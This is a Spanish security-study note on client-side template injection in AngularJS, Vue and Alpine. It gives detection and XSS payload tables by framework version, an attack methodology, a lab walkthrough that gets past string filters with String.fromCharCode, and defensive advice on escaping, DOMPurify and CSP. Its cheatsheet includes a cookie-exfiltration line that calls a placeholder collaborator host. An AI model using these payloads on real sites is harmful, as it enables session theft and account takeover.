---
aliases: ["CSTI", "Client-Side Template Injection", "Inyección de Plantillas del Lado del Cliente"]
tags:
  - sec/web
  - sec/web/cliente
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Server-Side Template Injection (SSTI)]]"
  - "[[Cross-Site Scripting XSS]]"
  - "[[Clickjacking Ataques]]"
  - "[[Prototype Pollution]]"
fuente: "https://portswigger.net/web-security/cross-site-scripting"
---

# Client-Side Template Injection (CSTI)

El **Client-Side Template Injection** (**CSTI**) es una vulnerabilidad en la que el atacante **inyeza expresiones en una plantilla de cliente** que el framework (AngularJS, Vue, Alpine, Ember...) **compila y ejecuta en el navegador de la víctima**. La plantilla no es decorado: es código con acceso al scope completo de la aplicación, por lo que controlarla equivale a XSS — pero con una particularidad: la ejecución la produce el propio motor de plantillas, no el navegador interpretando HTML suelto, lo que permite saltar ciertos filtros y sanitizadores pensados para XSS clásico.

> [!info] Diferencia clave entre CSTI y SSTI
> El [[Server-Side Template Injection (SSTI)|SSTI]] explota el motor de plantillas **del servidor** (Twig, Jinja2, Freemarker) y puede escalar a lectura de ficheros o RCE en el backend. El CSTI ataca el motor **del cliente**: su impacto máximo es JavaScript en el contexto de la víctima (robo de sesión, acciones autenticadas, keylogger). Ambos comparten la raíz: **interpolar entrada de usuario sin escapar dentro del template**, no en los datos que el template renderiza.

Un derivado común del CSTI es el XSS: una vez inyectada la expresión en el template, el atacante ejecuta JavaScript en el navegador de la víctima — robo de cookies de sesión, manipulación de datos mostrados, redirecciones maliciosas o acciones en su nombre.

> [!warning] CSTI como vector de XSS
> Al controlar la plantilla, el atacante puede inyectar directivas (`ng-*` en Angular), interpolaciones (`{{...}}`, `${...}`) o constructores JS que ejecutan código arbitrario en el navegador de la víctima, llevando a robo de cookies, defacement o redirecciones maliciosas.

> [!tip] Medidas de prevención (resumen; detalles al final)
> Escapar o sanear toda entrada **antes** de que entre en el motor de plantillas; usar frameworks con escape automático por defecto (Vue escapa en `{{ }}`; Angular escapa en interpolación y solo permite HTML con `ng-bind-html` + sanitizer); CSP estricta como segunda capa.

## Mecánica: por qué las plantillas de cliente son código

Una plantilla client-side no es HTML estático: el framework la **parsea en tiempo de ejecución** y su lenguaje de expresiones es deliberadamente Turing-completo en algunos casos. AngularJS (1.x) evalúa `{{ expresiónJS }}` contra un *scope* que puede alcanzar `window`; Vue evalúa expresiones de JS limitadas al scope del componente; los frameworks de dos vías (*two-way binding*) buscan dinámicamente propiedades — y ahí aparecen cadenas de proto como `constructor.constructor`.

| Motor | Sintaxis de interpolar | ¿Evalúa JS arbitrario? | Notas |
|---|---|---|---|
| **AngularJS 1.0–1.5** | `{{ expr }}`, directivas `ng-*` | Sí, con "sandbox" de expresiones (bypassable, ver abajo) | Sandbox eliminado en 1.6+ |
| **AngularJS 1.6+** | `{{ expr }}` | Sí, sin sandbox — el payload debe ser más directo | Sandbox se eliminó por bypasses infinitos |
| **Angular 2+** | interpolar con escaping; `innerHTML` no evalúa templates | No (el motor compilado solo aplica a templates propios) | No confundir con AngularJS |
| **Vue 2/3** | `{{ expr }}`, `v-html`, `v-bind` | Limitado al scope del componente; `v-html` solo inserta HTML | Riesgo cuando el server mete `{{ }}` de Vue en el HTML |
| **Alpine.js** | `x-data`, `@click`, `{{ }}` | Expresiones JS en atributos | Templates en el DOM |
| **Ember / Handlebars / Mustache** | `{{ }}` (logic-less) | No evalúa JS — solo lookups de propiedades | Sin sandbox que saltar: el riesgo es otro |
| **JS template literals** | `` `texto ${expr}` `` | Sí | Inyección cuando el server embebe input en el literal |

> [!tip] Detección de motores de plantillas
> Inyectar `{{7*7}}` o `{{'a'+'b'}}` y observar si el valor se evalúa (`49`, `ab`) en la respuesta es el test universal de template injection. La sintaxis que evalúa identifica el motor: `{{ }}` → Angular/Vue/Ember; `${ }` → template literals JS/Handlebars con helpers; `<%= %>` → EJS server-side (eso ya sería SSTI). Ver [[Server-Side Template Injection (SSTI)]] para el lado servidor.

### Catálogo de payloads por contexto

| Contexto | Payload de detección | Payload de explotación (XSS) |
|---|---|---|
| AngularJS (pre-1.6) | `{{7*7}}` → `49` | `{{constructor.constructor('alert(1)')()}}` |
| AngularJS 1.6+ | `{{7*7}}` → `49` | `{{_self.constructor.constructor('alert(1)')()}}` |
| AngularJS con CSP | igual | `{{_once=constructor.constructor('alert(1)')()}}` o versiones por versión en PayloadsAllTheThings |
| Vue | `{{7*7}}` → `49` | `{{_c.constructor('alert(1)')()}}` (limitado al scope) |
| Alpine.js | `x-data="{}"` | `@init="constructor.constructor('alert(1)')()"` |
| Template literal embebido | `${7*7}` → `49` | `${alert(1)}` / `${alert(document.cookie)}` |
| Jinja/Twig/TXT en cliente (raro) | `${7*7}` o `{{7*7}}` | normalmente no escalable en cliente |

> [!warning] La familia AngularJS sandbox
> AngularJS 1.x incluyó un *sandbox de expresiones* que intentaba impedir el acceso a `constructor`/`window`. Fue bypassado continuamente durante años (1.0.1–1.1.5: con `a=toString().constructor.prototype; a.charAt= [].join; ...`; 1.2–1.5: con `orderBy`/`filter` sobre arrays; ver el lab de abajo). Por eso en **1.6 el sandbox se eliminó**: los desarrolladores aceptaron que no podía mantenerse y prefirieron depender del escaping y la CSP. Para un pentester: identifica la versión exacta y usa el payload correspondiente de la tabla anterior o de PayloadsAllTheThings.

## Metodología de ataque

1. **Identificar el motor**: Wappalyzer, código fuente (`ng-app`, `v-cloak`, `x-data`, `data-bind`), response headers, comportamiento de `{{ }}` reflejado sin escapar.
2. **Confirmar evaluación**: inyectar `{{7*7}}`; si se muestra `49`, hay inyección (el servidor mete tu entrada en el template, no en los datos).
3. **Confirmar XSS**: payload de ejecución según versión (tabla anterior). `alert(1)` o `print()` como proof.
4. **Bypass de filtros**: si hay listas negras sobre cadenas ("alert", "constructor"), usar obfuscación: `String.fromCharCode(97,108,101,114,116,40,49,41)` para construir el string en ejecución; operadores matemáticos para evitar literales; Unicode/URL-encoding según el filtro.
5. **Impacto**: robo de cookie (`document.cookie` sin `httpOnly`), acciones autenticadas, combinación con CSRF token exfiltrado (ver [[Cross-Site Scripting XSS]]).

## Laboratorio: CSTI en AngularJS con filtros de cadenas

En este laboratorio, la web muestra contenido cargado dinámicamente. El flujo de prueba:

![[Pasted image 20260227102320.png]]

Veamos qué hace la web:

![[Pasted image 20260227102420.png]]

El problema nace de cómo la web carga el contenido: podemos ver el `index` directamente (entornos controlados del laboratorio):

![[Pasted image 20260227102717.png]]

La forma en que representa el contenido es vulnerable a interpretar lo que se le pasó. Comprobamos con una operación aritmética: `{{3*4}}` debe devolver `12`:

![[Pasted image 20260227102850.png]]

Observamos que efectivamente es vulnerable, pero a diferencia del [[Server-Side Template Injection (SSTI)]], no podemos directamente cargar archivos internos — el motor corre en el navegador. Tenemos que buscar payloads específicos, y para eso necesitamos saber qué tecnologías se usan:

![[{02ADA119-9446-4023-AA0A-68918F4338D6}.png]]

Vemos que se implementa **Angular**, por lo que usamos payloads específicos para Angular:

> [!tip] Payloads comunes para CSTI en Angular
> Angular usa `{{...}}` para interpolación. Los payloads explotan `window`/`document` vía `this.constructor.constructor('alert(1)')()` o `{{_self.__proto__.constructor.constructor('alert(1)')()}}`. La complejidad varía según versión y medidas de sanitización.

![[Pasted image 20260227103815.png]]

Usamos este payload, tomando en cuenta que hace referencia de arriba hacia abajo al título:

![[Pasted image 20260227103850.png]]

A partir de allí podemos intentar representar lo que queramos, pero no siempre es funcional: si intentamos un `Hacked` directo, no funciona (hay filtros sobre cadenas):

![[Pasted image 20260227104007.png]]

Lo enviamos y vemos qué:

![[Pasted image 20260227104033.png]]

Como observamos, no funcionó. La solución: representar los caracteres de forma alternativa. Primero probamos si la web acepta la reconstrucción usando la consola del navegador:

![[Pasted image 20260227104320.png]]

Mediante una función podemos representar primero los caracteres en numérico y pasarlos a letras. Para generar la cadena numérica jugamos con Python:

> [!info] Obfuscación de cadenas para bypass de filtros
> Cuando los filtros bloquean cadenas directas (como "Hacked"), convertir caracteres a representaciones numéricas (decimal, hexadecimal, octal) y reconstruirlos en ejecución (p. ej. `String.fromCharCode()` en JavaScript) evade listas negras basadas en literales.

![[Pasted image 20260227104616.png]]

Ya tenemos cada carácter en números; creamos la cadena con ellos:

![[{86D1AB33-643E-4E6C-80BA-BD6DC25BB455}.png]]

Copiamos esto directamente en la carga útil:

![[Pasted image 20260227104856.png]]

Y esto ya es funcional:

![[Pasted image 20260227104905.png]]

## Detección (defensor)

- WAF/alertas sobre `{{`, `${`, `constructor.constructor`, `ng-` en parámetros que luego se reflejan en el HTML.
- CSP estricta mitiga el impacto (bloquea `eval`/inline) pero no la inyección: AngularJS necesita `unsafe-eval` para compilar templates — sin `unsafe-eval`, el CSTI de AngularJS 1.x falla al compilar (ver CSP en [[Cross-Site Scripting XSS]]).
- Logs con expresiones matemáticas claramente artificiales (`7*7`) en parámetros de búsqueda.

## Impacto

1. **XSS completo** en el contexto del origen de la víctima: acciones autenticadas, lectura de DOM, exfiltración.
2. **Bypass de sanitizadores**: el sanitizador puede dejar pasar `{{ }}` porque "no es HTML", pero el framework lo evalúa como código.
3. **Robo de tokens CSRF** + ejecución = acciones de estado (ver [[Cross-Site Request Forgery (CSRF)]]).
4. Con CSP laxa o `unsafe-eval`, la mitigación de XSS no aplica al vector template.

## Prevención (con código)

```javascript
// VUE: nunca v-html con entrada de usuario
// ✗ riesgo: <div v-html="comentarioUsuario"></div>
// ✓ seguro: {{ comentarioUsuario }}  (escape automático del motor)

// AngularJS: la interpolación escapa; el riesgo es ng-bind-html
// ✗ riesgoso si el sanitizer no cubre directivas:
//   <div ng-bind-html="userInput"></div>
// ✓ usar $sce.trustAsHtml solo tras sanitizer explícito:
angular.module('app').filter('trust', ['$sce', $sce => html => $sce.trustAsHtml(DOMPurify.sanitize(html))]);
```

```http
# CSP que elimina el motor de plantillas de AngularJS (necesita unsafe-eval para compilar)
Content-Security-Policy: default-src 'self'; script-src 'nonce-abc123'; object-src 'none'; base-uri 'none'
# Sin 'unsafe-eval', AngularJS no puede compilar templates -> CSTI inerte
```

Reglas de diseño:
- **Escapar la entrada ANTES del template**, no dentro de los datos — si el servidor concatena `{{` + input + `}}` en el HTML servido, el escaping de salida normal no te salva.
- Sanitizar HTML con DOMPurify cuando se use `v-html`/`ng-bind-html`.
- No depender de blacklists sobre "alert"/"constructor": son evadibles con `fromCharCode` (lab de arriba).
- Frameworks logic-less (Mustache/Handlebars sin helpers peligrosos) reducen la superficie: no evalúan JS.
- Mantener AngularJS actualizado no es suficiente (1.6+ no tiene sandbox); la defensa es escaping + CSP sin `unsafe-eval`.

## Errores comunes

**Atacante:**
1. Confundir Angular (2+) con AngularJS (1.x): el payload de constructor no aplica al nuevo Angular compilado.
2. Probar solo `{{7*7}}` y concluir "no vulnerable" cuando el motor usa otra sintaxis (`${ }`, `x-data`).
3. No identificar la versión de AngularJS: el sandbox (o su ausencia) cambia el payload necesario.
4. Esperar RCE/ficheros como en SSTI: en CSTI el techo es el navegador de la víctima.

**Defensor (falsas soluciones):**
1. Sanear `<script>` y atributos de evento pero dejar pasar `{{ }}` — el motor los evalúa como código.
2. Confiar en que "solo escapamos comillas": `{{constructor...}}` no necesita romper atributos si vive en texto del template.
3. CSP con `unsafe-eval` "porque Angular lo pide" — habilita el CSTI; migrar o eliminar el motor.
4. Filtrar la palabra "alert" literal (lab: se bypasea con `fromCharCode`).

## Cheatsheet

| Paso | Acción |
|---|---|
| Detección universal | `{{7*7}}`, `${7*7}` |
| Motor | `ng-app` / `v-cloak` / `x-data` / Wappalyzer |
| AngularJS pre-1.6 | `{{constructor.constructor('alert(1)')()}}` |
| AngularJS 1.6+ | `{{_self.constructor.constructor('alert(1)')()}}` |
| Vue | `{{_c.constructor('alert(1)')()}}` |
| Bypass de blacklist | `String.fromCharCode(...)` para literales |
| Impacto demo | `alert(document.cookie)` / `fetch('https://collab/?c='+btoa(document.cookie))` |

## Laboratorios y referencias

- PortSwigger — XSS con AngularJS (sandbox escapes): https://portswigger.net/web-security/cross-site-scripting
- PayloadsAllTheThings — SSTI/CSTI payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSTI
- Angular — Expression sandbox history (issue #12475): https://github.com/angular/angular.js/issues/12475
- DOMPurify: https://github.com/cure53/DOMPurify

## Relacionadas

- [[Server-Side Template Injection (SSTI)]] — el lado servidor del mismo error de diseño
- [[Cross-Site Scripting XSS]] — el impacto final (robo de cookies, CSP bypass, DOM sinks)
- [[Clickjacking Ataques]] — otros vectores de ejecución de código en el contexto de la víctima
- [[Prototype Pollution]] — a veces el CSTI se potencia con cadenas de proto contaminadas en frameworks JS
